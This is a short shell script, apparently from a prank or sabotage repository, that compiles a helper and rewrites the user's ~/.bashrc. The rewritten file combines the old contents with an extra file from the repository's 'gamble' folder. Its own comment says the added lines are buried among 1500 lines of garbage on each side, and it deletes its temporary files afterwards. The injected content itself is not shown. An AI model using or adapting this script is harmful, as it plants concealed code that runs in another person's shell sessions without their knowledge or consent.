#!/bin/sh
#sets dir to epita-wreaker/lag
repo=$1

if [ -e ~/.bashrc ]; then
	mv ~/.bashrc tmpbashrc
else
	touch tmpbashrc
fi

gcc -std=c99 -s $repo/lib/makerc.c -o make.bin
#args are: pre lines, post lines, destination, sources
./make.bin 1500 1500 $HOME/.bashrc tmpbashrc $repo/gamble/gambashrc			#puts contents of new bashrc(old bashrc + new content) in place in the middle of garbage

rm tmpbashrc
rm make.bin

